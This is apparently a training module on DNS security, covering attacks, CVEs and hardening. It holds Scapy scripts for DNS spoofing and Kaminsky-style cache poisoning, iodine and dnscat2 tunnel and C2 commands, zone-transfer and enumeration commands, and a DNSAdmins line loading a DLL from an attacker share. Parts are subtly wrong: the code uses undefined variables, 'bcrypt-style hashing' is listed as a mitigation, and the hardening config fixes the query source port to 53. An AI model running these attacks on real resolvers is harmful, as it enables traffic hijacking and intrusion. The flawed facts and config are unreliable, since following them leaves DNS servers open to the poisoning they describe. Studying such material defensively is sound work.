# DNS Security

## DNS Protocol Fundamentals

The Domain Name System is a hierarchical, distributed database that maps human-readable names to network addresses. Its fundamental design prioritized functionality over security, creating decades of exploitation surface.

```
┌────────────────────────────────────────────────────────────────┐
│                    DNS HIERARCHY                                │
│                                                                 │
│                        ┌───────┐                                │
│                        │  Root │  (.)                            │
│                        └───┬───┘                                │
│           ┌────────────┼───────┬────────────┐                   │
│        ┌──┴──┐    ┌───┴──┐ ┌──┴──┐    ┌───┴──┐                 │
│        │.com  │    │.org  │ │.net │    │.gov │  (TLD)           │
│        └──┬──┘    └──┬───┘ └──┬──┘    └──┬───┘                  │
│        ┌──┴──┐    ┌──┴──┐     ┌─┴─┐      ┌┴──┐                   │
│        │exam │    │exam │    │   │      │   │   (2LD)            │
│        │ple  │    │ple  │    │   │      │   │                    │
│        └──┬──┘    └──┬──┘    └───┘      └───┘                    │
│     ┌────┴───┐   ┌───┴───┐                                       │
│     │www     │   │mail   │   (Subdomain/hostname)                 │
│     │ns1     │   │ftp    │                                       │
│     └────────┘   └───────┘                                       │
│                                                                 │
│  DNS Message Format:                                            │
│  ┌──────────┬──────────┬──────────┬──────────┐                   │
│  │  Header  │ Question │ Answer   │Authority │                   │
│  │ 12 bytes │  section │ section  │ +Addtl   │                   │
│  └──────────┴──────────┴──────────┴──────────┘                   │
│                                                                 │
│  Header: ID(2) | Flags(2) | QDCOUNT(2) | ANCOUNT(2) |          │
│          NSCOUNT(2) | ARCOUNT(2)                                 │
│                                                                 │
│  Resource Record: NAME | TYPE(2) | CLASS(2) | TTL(4) |          │
│                   RDLENGTH(2) | RDATA(...)                      │
└────────────────────────────────────────────────────────────────┘
```

### DNS Query Types and Their Security Implications

| Type | Value | Security Relevance |
|------|-------|-------------------|
| A | 1 | IPv4 address — target for spoofing |
| AAAA | 28 | IPv6 address — see IPv6 attacks section |
| CNAME | 5 | Alias — chain following amplifies attack surface |
| MX | 15 | Mail exchange — email interception vectors |
| TXT | 16 | Arbitrary text — SPF/DKIM/DMARC bypass, data exfiltration |
| NS | 2 | Name server — delegation hijacking target |
| SOA | 6 | Start of authority — zone transfer starting point |
| AXFR | 252 | Full zone transfer — complete DNS data leak |
| ANY | 255 | All records — amplification vector |
| DNSKEY | 48 | DNSSEC public key — see DNSSEC section |
| RRSIG | 46 | DNSSEC signature — validation target |

### DNS Transaction Security

DNS uses a 16-bit transaction ID and source port for matching queries to responses — both are trivially predictable:

```python
from scapy.all import *

def dns_spoof_basic(target_domain, fake_ip, resolver_ip):
    """Basic DNS spoofing exploiting 16-bit TXID"""
    # DNS queries use random TXID (0-65535) and random source port
    # Attack: flood with ~65000 responses to guess TXID
    
    for txid in range(65536):
        dns_response = IP(dst=resolver_ip) / \
                       UDP(sport=53, dport=resolver_port) / \
                       DNS(id=txid, qr=1, 
                           ancount=1,
                           qd=DNSQR(qname=target_domain, qtype='A'),
                           an=DNSRR(rrname=target_domain, 
                                   type='A',
                                   ttl=300,
                                   rdata=fake_ip))
        send(dns_response, verbose=0)
    
    # Even with random TXID, ~50% success rate with 65000 guesses
    # This is why Kaminsky's attack was revolutionary
```

## DNS Cache Poisoning: The Kaminsky Attack

### Pre-Kaminsky: Basic Cache Poisoning

Before Kaminsky's 2008 disclosure, DNS cache poisoning required:

1. Send query for random.example.com
2. Race the legitimate response
3. Guess 16-bit TXID (65536 possibilities)
4. Guess source port (if randomized)
5. ~65000 packets per attempt

This was impractical for most attackers.

### The Kaminsky Attack (2008)

Kaminsky's insight: **You don't need to attack a specific query — attack the bailiwick**:

```
┌────────────────────────────────────────────────────────────────┐
│                 KAMINSKY ATTACK FLOW                             │
│                                                                 │
│  1. Attacker queries for 1337.example.com (random subdomain)     │
│                                                                 │
│  Attacker ──► Target ──► Authoritative for example.com          │
│   "Where is     Cache     │                                    │
│   1337.example.  Miss!    │  Recursive query                   │
│   com?"                   ▼                                    │
│                     ┌──────────────┐                           │
│                     │ Auth NS for   │                           │
│                     │ example.com   │                           │
│                     └──────┬───────┘                           │
│                            │                                   │
│  2. Attacker floods target with spoofed responses               │
│                                                                 │
│  Attacker ──► Target (flooded with spoofed responses)           │
│   "1337.example.com = 1.2.3.4"                                 │
│   "example.com NS = attacker.ns"  ← DELEGATION TO ATTACKER     │
│                                                                 │
│  3. If spoof wins the race:                                     │
│     - 1337.example.com is poisoned                             │
│     - attacker.ns is CACHED as authoritative                    │
│                                                                 │
│  4. Attacker queries www.example.com                             │
│     Target FOLLOW delegation to attacker.ns                      │
│     www.example.com resolves to ATTACKER IP                     │
│                                                                 │
│  Key insight: Each random query is a new chance to race!        │
  │  Not limited to a single query — infinite attempts!            │
│  Average success in ~10 seconds with broadband                  │
└────────────────────────────────────────────────────────────────┘
```

```python
from scapy.all import *
import random
import string

def kaminsky_attack(target_resolver, domain, attacker_ns_ip, attacker_ns_name):
    """Kaminsky-style cache poisoning attack"""
    
    while True:
        # Generate random subdomain to force new lookup
        random_subdomain = ''.join(random.choices(string.ascii_lowercase, k=8))
        fqdn = f"{random_subdomain}.{domain}"
        
        # Send query to force recursive lookup
        dns_query = IP(dst=target_resolver) / \
                    UDP(sport=random.randint(1024, 65535), dport=53) / \
                    DNS(qd=DNSQR(qname=fqdn, qtype='A'))
        send(dns_query, verbose=0)
        
        # Flood with spoofed responses from authoritative
        for txid in range(65536):
            for src_port in [53]:  # Try common source port if predictable
                spoofed = IP(src=" authoritative_ip", dst=target_resolver) / \
                          UDP(sport=src_port, dport=dns_query.dport) / \
                          DNS(id=txid, qr=1, aa=1,
                              qd=DNSQR(qname=fqdn, qtype='A'),
                              an=DNSRR(rrname=fqdn, type='A', rdata=attacker_ns_ip),
                              ns=DNSRR(rrname=domain, type='NS', rdata=attacker_ns_name),
                              ar=DNSRR(rrname=attacker_ns_name, type='A', rdata=attacker_ns_ip))
                send(spoofed, verbose=0)
```

**Mitigation**: DNSSEC (signed responses), source port randomization, TXID randomization (0-65535), bcrypt-style hashing of responses.

## DNS Rebinding

DNS rebinding exploits the same-origin policy by changing a domain's DNS resolution after page load:

```
┌────────────────────────────────────────────────────────────────┐
│                  DNS REBINDING ATTACK                            │
│                                                                 │
│  1. Attacker controls evil.com                                  │
│  2. Victim visits http://evil.com                               │
│  3. DNS resolves evil.com → 167.x.x.x (attacker public IP)    │
│  4. Browser enforces same-origin policy for evil.com            │
│  5. JavaScript on evil.com makes XHR to http://evil.com/admin  │
│  6. Attacker changes DNS: evil.com → 192.168.1.1 (internal)   │
│  7. Browser sees same origin (evil.com) → sends request        │
│  8. Request reaches internal device!                            │
│                                                                 │
│  DNS Records (TTL=0 or very short):                            │
│  evil.com.  IN  A  167.x.x.x  ; First resolution               │
│  evil.com.  IN  A  192.168.1.1 ; Rebind resolution              │
│                                                                 │
│  Or use multiple A records (browser may alternate):            │
│  rebinding.evil.com. IN A 167.x.x.x                            │
│  rebinding.evil.com. IN A 192.168.1.1                           │
│  rebinding.evil.com. IN A 127.0.0.1                             │
└────────────────────────────────────────────────────────────────┘
```

### DNS Rebinding for SSRF Bypass

```python
# DNS rebinding service (educational)
from http.server import HTTPServer, BaseHTTPRequestHandler
import dns.server

class RebindingDNSHandler:
    """Alternates DNS responses for rebinding"""
    first_query = True
    
    def resolve(self, name):
        if self.first_query:
            self.first_query = False
            return "167.x.x.x"  # External IP (passes SSRF check)
        else:
            return "169.254.169.254"  # AWS metadata (SSRF target)

# Python rebinding tool: https://github.com/sensepost/rebind
# Or use: https://lock.cmpxchg8b.com/rebind.html

# Node.js rebinding server example:
# First resolution: attacker external IP
# Subsequent: internal IP (169.254.169.254, 127.0.0.1, etc.)
```

**Mitigations against DNS rebinding**:
- Server-side DNS pinning (cache DNS resolution, reject changes)
- Validate Host header against allowlist
- Egress filtering (internal services should not be internet-routable)
- Browser DNS pinning (limited effectiveness — Chrome pins for ~60s)
- DNS firewall rules blocking internal IP responses from external DNS

## DNS Amplification DDoS

DNS amplification exploits the asymmetric ratio of query-to-response sizes:

```
┌────────────────────────────────────────────────────────────────┐
│               DNS AMPLIFICATION ATTACK                           │
│                                                                 │
│  Attacker                Open Resolver            Victim          │
│     │                         │                      │          │
│     │── UDP SRC:Victim:53 ──►│                      │          │
│     │   "ANY isc.org?"        │                      │          │
│     │                         │                      │          │
│     │                         │─── 4096 byte ───────►│          │
│     │   (64 byte query)      │   response            │          │
│     │                         │                      │          │
│     │   Amplification factor: 4096/64 = 64x          │          │
│                                                                 │
│  EDNS0 allows responses up to 4096 bytes                       │
│  ANY queries maximize response size                            │
│  Common amplification factors:                                  │
│    DNS ANY:      28-54x                                         │
│    DNSSEC:       44-178x                                        │
│    Amplification = ResponseSize / QuerySize                     │
│                                                                 │
│  Mitigation:                                                    │
│  - Source IP validation (BCP 38)                               │
│  - Rate limiting DNS responses                                 │
│  - Disabling ANY queries (RFC 8482)                             │
│  - Response Rate Limiting (RRL)                                 │
│  - DNS-over-TLS/HTTPS (reduces spoofing utility)               │
└────────────────────────────────────────────────────────────────┘
```

```bash
# Response Rate Limiting (BIND)
rate-limit {
    responses-per-second 5;
    nxdomains-per-second 2;
    slip 2;  # Drop every other response over limit
    window 5;
};

# Checking for open resolvers
nmap -sU -p 53 --script dns-recursion <target>
dig @<resolver> +dnssec ANY isc.org  # Check amplification
```

## DNS Tunneling

DNS tunneling exfiltrates data through DNS queries and responses, bypassing most firewalls that allow UDP/53 outbound:

```
┌────────────────────────────────────────────────────────────────┐
│                  DNS TUNNELING                                   │
│                                                                 │
│  Client (inside)            DNS Tunnel Server                   │
│     │                              │                            │
│     │── k9j2m3.example.com ──────►│                            │
│     │   (encoded data in label)   │                            │
│     │                              │─── Decodes data            │
│     │                              │─── Sends response          │
│     │◄── CNAME x7h4p2.com ───────│                            │
│     │   (encoded response)        │                            │
│                                                                 │
│  Tools:                                                         │
│  - iodine: IP-over-DNS tunnel                                   │
│  - dnscat2: Encrypted C2 over DNS                               │
│  - dns2tcp: TCP-over-DNS proxy                                  │
│  - DNSExfiltrator: Data exfiltration via DNS                    │
└────────────────────────────────────────────────────────────────┘
```

### iodine: IP-over-DNS

```bash
# Server (attacker's system)
iodined -f -P secret 10.0.0.1 tunnel.example.com

# Client (inside target network)
iodine -f -P secret <dns_server_ip> tunnel.example.com

# After connection: virtual network interface (dns0) with IP 10.0.0.x
# Full IP tunnel over DNS — can run any protocol
ping 10.0.0.1  # Works over DNS!
ssh user@10.0.0.1  # SSH over DNS!

# Detection: Unusually large DNS queries, high volume of TXT/CNAME queries
# Unusual subdomains, consistently long labels (max 63 chars per label)
```

### dnscat2: Encrypted C2 over DNS

```bash
# Server
ruby dnscat2.rb example.com --secret=secretkey

# Client
dnscat2-v0.01-client-linux-amd64 --domain example.com --secret secretkey

# Detection: High-frequency DNS queries, long encoded subdomain labels
# Monitor for base64/base32 patterns in DNS query names

# Suricata/Snort detection
alert udp any any -> any 53 (msg:"DNS Tunnel - Long Label"; \
  content:"|00 01 00 00|"; offset:6; depth:4; \
  pcre:"/[a-z0-9]{50,}/i"; sid:20240001;)
```

## DNSSEC Vulnerabilities

### DNSSEC Overview

```
┌────────────────────────────────────────────────────────────────┐
│                    DNSSEC ARCHITECTURE                           │
│                                                                 │
│  DNSSEC adds cryptographic signatures to DNS records:            │
│                                                                 │
│  ┌───────────┐    ┌───────────────┐    ┌──────────────┐        │
│  │ KSK       │    │ ZSK           │    │ NSEC/NSEC3   │        │
│  │ Key Signing│    │ Zone Signing  │    │ Denial of    │        │
│  │ Key       │    │ Key           │    │ Existence    │        │
│  └─────┬─────┘    └──────┬────────┘    └──────┬───────┘        │
│        │                 │                     │                  │
│  Signs: DNSKEY    Signs: RRsets          Signs: NXDOMAIN         │
│  record           (A, MX, etc.)          responses              │
│                                                                 │
│  Chain of Trust:                                                │
│  Root KSK → .com KSK → example.com KSK → example.com ZSK      │
│       │            │             │                   │           │
│  DS record    DS record    DS record          RRSIG records      │
│  in Root      in .com       in example.com    (signed by ZSK)   │
│                                                                 │
│  Record Types:                                                  │
│  DNSKEY:  Public keys (KSK and ZSK)                            │
│  RRSIG:   Resource record signature                             │
│  DS:      Delegation signer (hash of child KSK)                 │
│  NSEC:    Next secure record (proves non-existence)             │
│  NSEC3:   Hashed next record (prevents zone walking)            │
└────────────────────────────────────────────────────────────────┘
```

### DNSSEC Attack Surface

1. **Zone walking with NSEC**: NSEC records reveal neighboring domain names, enabling complete zone enumeration

```
Query: example.com NEXIST.example.com
Response: NSEC alpha.example.com beta.example.com
  → Reveals existence of alpha.example.com and beta.example.com

Next query: beta.example.com NEXIST
Response: NSEC beta.example.com gamma.example.com
  → Reveals gamma.example.com

Continue until entire zone is enumerated
```

NSEC3 mitigates this by hashing domain names.

2. **DNSSEC key rollover failures**: KSK rollover is operationally complex; the 2018 Root KSK rollover had multiple delays
3. **Algorithm downgrade attacks**: Force weaker signing algorithms
4. **Signature replay during short TTL**: Replay valid RRSIG records

### CVE-2020-1350 — SIGRed

```c
// CVE-2020-1350: Windows DNS Server Remote Code Execution
// Buffer overflow in DNS server's handling of SIG records
// 
// Vulnerability: sig.nameSize calculation flaw in dns.exe
// The DNS server incorrectly calculates buffer size for 
// decompressed domain names in SIG records
//
// Affected: Windows Server 2003 through Server 2019
// CVSS: 10.0 (Critical)
//
// Attack vector:
// 1. Attacker sends DNS query for SIG record
// 2. Recursive query to attacker-controlled NS
// 3. Malicious SIG response triggers heap overflow
// 4. RCE as SYSTEM (dns.exe runs as LOCAL_SYSTEM)
//
// Exploit requires:
// - DNS recursion enabled (default)
// - No DNSSEC validation required (pre-validation overflow)
//
// Packet structure:
// DNS SIG record with:
//   - nameSize > allocated buffer length
//   - Specifically crafted domain name compression
//
// Mitigation:
// reg add HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters ^
//   /v TcpReceivePacketLimit /t REG_DWORD /d 0xFF00 /f
// Then restart DNS service
```

### CVE-2015-7547 — glibc DNS Resolver Buffer Overflow

```c
// CVE-2015-7547: glibc getaddrinfo() buffer overflow
// 
// Vulnerability in glibc's DNS client resolver
// Affects virtually all Linux systems (glibc <= 2.22)
//
// Stack-based buffer overflow when processing:
// 1. A response with both A and AAAA records
// 2. Where the AAAA response contains crafted data
//
// Attack scenario:
// 1. Victim calls getaddrinfo("attacker.com", ...)
// 2. glibc sends parallel A and AAAA queries
// 3. Attacker's DNS returns malformed AAAA response
// 4. Buffer overflow on stack → RCE
//
// Triggers even without DNSSEC
// Requires attacker to control DNS response
// (via MITM, rogue DNS, or cache poisoning)
//
// Mitigation: glibc 2.23+ or applied patches
```

## DANE (DNS-Based Authentication of Named Entities)

DANE uses DNSSEC to bind certificates or keys to domain names, augmenting or replacing CA-based trust:

```
┌────────────────────────────────────────────────────────────────┐
│                    DANE TLSA RECORDS                             │
│                                                                 │
│  TLSA Record Format:                                            │
│  _port._proto.domain TLSA CertUsage Selector MatchingType Data  │
│                                                                 │
│  Certificate Usage:                                             │
│    0 = CA constraint (must chain to this CA)                   │
│    1 = Service certificate constraint (must chain + match EE)   │
│    2 = Trust anchor assertion (self-signed OK)                  │
│    3 = Domain-issued certificate (match cert directly)          │
│                                                                 │
│  Selector:                                                      │
│    0 = Full certificate                                         │
│    1 = SubjectPublicKeyInfo                                      │
│                                                                 │
│  Matching Type:                                                 │
│    0 = Exact match                                               │
│    1 = SHA-256 hash                                              │
│    2 = SHA-512 hash                                              │
│                                                                 │
│  Examples:                                                      │
│  ;; Pin specific certificate (PKP-style)                        │
│  _443._tcp.example.com TLSA 3 1 1 0123456789abcdef...          │
│                                                                 │
│  ;; Pin CA (like current CA system + DNSSEC)                   │
│  _443._tcp.example.com TLSA 2 1 1 0123456789abcdef...          │
│                                                                 │
│  Advantages over X.509 PKI:                                    │
│  - DNSSEC provides channel security                            │
│  - Eliminates CA compromise risk                                │
│  - Supports self-signed certs (usage 2,3)                       │
│                                                                 │
│  Deployment challenges:                                         │
│  - Requires DNSSEC deployment (chicken-and-egg)                 │
│  - DNS providers must support TLSA records                      │
│  - Browser support limited (not in Chrome/Firefox by default)  │
│  - DANEstamp for SMTP increasingly deployed                     │
└────────────────────────────────────────────────────────────────┘
```

## DNS-over-HTTPS vs DNS-over-TLS: Privacy Implications

```
┌────────────────────────────────────────────────────────────────┐
│              DoH vs DoT Privacy Comparison                      │
│                                                                 │
│  DNS-over-TLS (DoT) - RFC 7858:                               │
│  ┌──────┐ ──── TCP/853 (TLS) ────── ┌──────┐                │
│  │Client│                              │Server│                │
│  └──────┘                              └──────┘                │
│  - Dedicated port 853                                             │
│  - Network-visible as DNS traffic                                 │
│  - ISP can see that DNS is happening (but not contents)         │
│  - Opportunistic vs Strict modes                                 │
│  - SMTP STARTTLS-like upgrade mechanism                          │
│                                                                 │
│  DNS-over-HTTPS (DoH) - RFC 8484:                              │
│  ┌──────┐ ──── HTTPS/443 ──────── ┌──────┐                   │
│  │Client│  (blends with web)       │Server│                    │
│  └──────┘                          └──────┘                    │
│  - Uses port 443 (indistinguishable from HTTPS)                 │
│  - Bypasses corporate DNS policies                               │
│  - Centralizes DNS with large providers (Google, Cloudflare)   │
│  - Browser-integrated (Firefox, Chrome)                        │
│                                                                 │
│  Privacy Trade-offs:                                             │
│  ┌───────────────┬───────────┬───────────┐                      │
│  │   Threat       │    DoT    │    DoH    │                     │
│  ├───────────────┼───────────┼───────────┤                      │
│  │ ISP sees DNS? │ Yes (port)│ No        │                     │
│  │ ISP sees it's │ Yes       │ No (HTTPS)│                      │
│  │   DNS?        │           │           │                     │
│  │ Corporate      │ Blocked   │ Harder    │                     │
│  │   filtering?  │ easily    │ to block  │                     │
│  │ DNS provider   │ ISP       │ Google/   │                     │
│  │   sees query? │ + resolver│ Cloudflare│                     │
│  │ Centralization│ No        │ YES🔺      │                    │
│  └───────────────┴───────────┴───────────┘                      │
│                                                                 │
│  OPSEC considerations:                                           │
│  - DoH can be detected via SNI (dns.google, cloudflare-dns.com)│
│  - ESNI/ECH needed to hide DoH destination                      │
│  - Firefox DoH can be disabled via about:config                 │
│  - Enterprise policy: DNSOverHTTPS.Mode=off                    │
└────────────────────────────────────────────────────────────────┘
```

## Zone Transfer Attacks

Unauthorized zone transfers leak entire DNS zones:

```bash
# Attempt zone transfer
dig @ns1.example.com example.com AXFR

# Axfr tool for zone transfer enumeration
axfrdig -x example.com ns1.example.com

# Enumerate all NS records and attempt AXFR on each
for ns in $(dig example.com NS +short); do
    echo "Trying $ns"
    dig @$ns example.com AXFR
done

# DNSrecon - automated zone transfer testing
dnsrecon -d example.com -t axfr

# Fierce domain scanner
fierce --domain example.com
```

Mitigation: Restrict AXFR to trusted secondaries only, use TSIG authentication for zone transfers.

## DNS Watermarking

DNS watermarks embed identifiers in DNS queries to track users:

```
┌────────────────────────────────────────────────────────────────┐
│                  DNS WATERMARKING                               │
│                                                                 │
│  Tracker embeds unique identifier in DNS queries:              │
│                                                                 │
│  User visits: tracker.example.com                               │
│  DNS query generated: <unique_id>.tracker.example.com          │
│                   e.g., a7f3b2c.tracker.example.com             │
│                                                                 │
│  <unique_id> encodes:                                           │
│  - User IP address                                              │
│  - Timestamp                                                    │
│  - Cookie/correlation ID                                        │
│  - Browser fingerprint                                          │
│                                                                 │
│  The unique subdomain doesn't need to resolve —                │
│  the authoritative NS for tracker.example.com logs it           │
│                                                                 │
│  Use cases (legitimate):                                        │
│  - Tracking DNS abuse                                           │
│  - Security research (identifying botnet queries)               │
│                                                                 │
│  Use cases (surveillance):                                      │
│  - User tracking across networks                                │
│  - Deanonymization                                              │
│  - Government surveillance                                      │
│                                                                 │
│  Detection: Unusual subdomain patterns in DNS logs              │
│  Mitigation: DNS-over-HTTPS, DNS-over-TLS, encrypted DNS       │
└────────────────────────────────────────────────────────────────┘
```

## NXDOMAIN Attacks

### Water Torture / NXDOMAIN Flood

```
┌────────────────────────────────────────────────────────────────┐
│              NXDOMAIN ATTACK (Water Torture)                    │
│                                                                 │
│  Attacker floods DNS with queries for random non-existent      │
│  subdomains, exhausting cache and server resources:            │
│                                                                 │
│  a1b2c3d4.example.com → NXDOMAIN                              │
│  e5f6g7h8.example.com → NXDOMAIN                              │
│  i9j0k1l2.example.com → NXDOMAIN                              │
│  ...millions per second...                                     │
│                                                                 │
│  Impact:                                                        │
│  1. DNS cache fills with NXDOMAIN responses                    │
│  2. Each NXDOMAIN requires recursive lookup to authoritative   │
│  3. Authoritative servers overwhelmed                          │
│  4. Legitimate queries timeout                                  │
│                                                                 │
│  Used in Mirai variants (see 06_network_case_studies_future.md)│
│                                                                 │
│  Mitigation:                                                    │
│  - Rate limiting NXDOMAIN responses (RRL)                      │
│  - Response Rate Limiting (BIND RRL)                           │
│  - DNS caches with negative caching TTL limits                 │
│  - Anycast DNS infrastructure                                  │
│  - NXDOMAIN rate-based blocking                                │
└────────────────────────────────────────────────────────────────┘
```

## DNS Security in Active Directory

```
┌────────────────────────────────────────────────────────────────┐
│            DNS SECURITY IN ACTIVE DIRECTORY                      │
│                                                                 │
│  AD integrates DNS as a core service:                            │
│                                                                 │
│  ┌──────────────────────────────────────────────────┐           │
│  │ AD DNS Zone stored in AD LDS (Active Directory) │           │
│  │ - Domain Controllers are DNS servers              │           │
│  │ - DNS zones stored in AD database                │           │
│  │ - Secure Dynamic Updates (Kerberos-authenticated)│           │
│  └──────────────────────────────────────────────────┘           │
│                                                                 │
│  Attack vectors:                                                 │
│                                                                 │
│  1. INSECURE DYNAMIC UPDATES                                    │
│     - Non-secure: Any client can register records              │
│     - Attacker registers fake A record for server              │
│     - Warranty: Inconspicuous name collision                    │
│                                                                 │
│  2. ADIDNS ZONE ENUMERATION                                     │
│     - AD DNS zone readable by authenticated users             │
│     - LDAP query: All DNS records visible                      │
│     - Reveals internal hostnames and IPs                        │
│                                                                 │
│  3. WPAD ATTACK                                                  │
│     - Register wpad.example.com via dynamic update              │
│     - Proxy auto-discovery uses this name                      │
│     - Attacker becomes default proxy → MITM                    │
│                                                                 │
│  4. DNS ADMIN TO DCSYNC                                          │
│     - DNSAdmins group can load custom DLL on DC                │
│     - Privilege escalation: DNSAdmins → Domain Admins          │
│     - Method: dnscmd /config /serverlevelplugindll \\attacker\evil.dll│
│                                                                 │
│  5. GLOBAL NAMES BLOCKING (WINS)                                │
│     - GlobalNames zone used for single-label resolution        │
│     - CVE-2009-2507: WINS buffer overflow in DNS server        │
│                                                                 │
│  Tool: SharpAdidnsdump for ADIDNS enumeration                   │
│  Tool: PowerMad for WPAD attack                                 │
│  Mitigation: Require secure dynamic updates, disable WINS,     │
│              restrict DNSAdmins group membership                 │
└────────────────────────────────────────────────────────────────┘
```

### DNS Reconnaissance Techniques

```bash
# DNS enumeration toolkit
# Forward enumeration
dnsrecon -d example.com -t std

# Reverse enumeration
dnsrecon -r 10.0.0.0/24 -n 10.0.0.1

# Zone walking (DNSSEC NSEC)
ldns-walk example.com
dnsrecon -d example.com -t zonewalk

# Brute force subdomains
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dns.txt

# Cache snooping
dig @resolver example.com +dnssec | grep "flags:" | grep qr

# DNSSEC testing
dnsviz.net example.com
```

### DNS Security Hardening

```bash
# BIND hardening
options {
    recursion no;                    # Disable open recursion
    allow-recursion { trusted; };    # Restrict recursion
    allow-query { trusted; };        # Restrict queries
    allow-transfer { secondaries; };  # Restrict AXFR
    dnssec-validation auto;          # Enable DNSSEC
    rate-limit {                      # RRL
        responses-per-second 10;
        nxdomains-per-second 5;
    };
    minimal-responses yes;           # Reduce amplification
    query-source port 53;            # Fixed port (behind firewall)
};

# DNS-over-TLS (unbound)
server:
    tls-cert-bundle: /etc/ssl/certs/ca-certificates.crt
forward-zone:
    name: "."
    forward-addr: 1.1.1.1@853#cloudflare-dns.com
    forward-addr: 9.9.9.9@853#dns.quad9.net
    forward-tls-upstream: yes
```

**Cross-references**: See `01b_tls_ssl_crypto_protocols.md` for DoH/DoT TLS security, `02b_bgp_routing_security.md` for BGP hijacking of DNS infrastructure, `04a_network_attacks_mitm.md` for DNS spoofing in MITM attacks, `03b_vpn_tunnel_security.md` for DNS leak prevention in VPNs, and Cloud Security track for Route 53 security.

## References

1. RFC 1035 — Domain Names: Implementation and Specification. P. Mockapetris, IETF, November 1987.
2. RFC 1034 — Domain Names: Concepts and Facilities. P. Mockapetris, IETF, November 1987.
3. Kaminsky, D. — DNS Cache Poisoning: The Next Generation. Black Hat USA, 2008.
4. RFC 5452 — Measures for Making DNS More Resistant to Forged Answers. A. Hubert, R. van Mook, IETF, January 2009.
5. RFC 4033 — DNS Security Introduction and Requirements. R. Arends et al., IETF, March 2005.
6. RFC 4034 — Resource Records for DNS Security Extensions. R. Arends et al., IETF, March 2005.
7. RFC 4035 — Protocol Modifications for DNS Security Extensions. R. Arends et al., IETF, March 2005.
8. CVE-2020-1350 — SIGRed: Windows DNS Server Remote Code Execution. NVD, 2020.
9. CVE-2015-7547 — glibc getaddrinfo() buffer overflow. NVD, 2015.
10. RFC 6698 — The DNS-Based Authentication of Named Entities (DANE) TLS Protocol. P. Hoffman, J. Schlyter, IETF, August 2012.
11. RFC 7858 — Specification for DNS over TLS. Z. Hu et al., IETF, May 2016.
12. RFC 8484 — DNS Queries over HTTPS (DoH). P. Hoffman, P. McManus, IETF, October 2018.
13. NIST SP 800-81 Rev. 2 — Secure Domain Name System (DNS) Deployment Guide. R. Chandramouli, S. Rose, NIST, May 2020.
14. RFC 8482 — Providing Minimal Responses to ANY Queries. M. Nottingham, IETF, January 2019.
15. Jackson, D. et al. — DNS Rebinding: Exploiting the Browser's Trust in the Same-Origin Policy. UC Berkeley, 2007.
16. CVE-2009-3555 — TLS renegotiation vulnerability (applicable to DNS-over-TLS). NVD, 2009.
17. Van Dijk, M. et al. — Off-Path TCP Sequence Number Inference Attack. ACM CCS, 2012.
18. RFC 6844 — DNS Certification Authority Authorization (CAA). P. Hallam-Baker, R. Stradling, IETF, January 2013.
19. Santanna, J.J. et al. — DNS Amplification Attacks: A Case Study on DNSSEC. NDSS Workshop, 2016.
20. IDC — DNS Tunneling: How Attackers Use DNS to Exfiltrate Data. Various security research publications.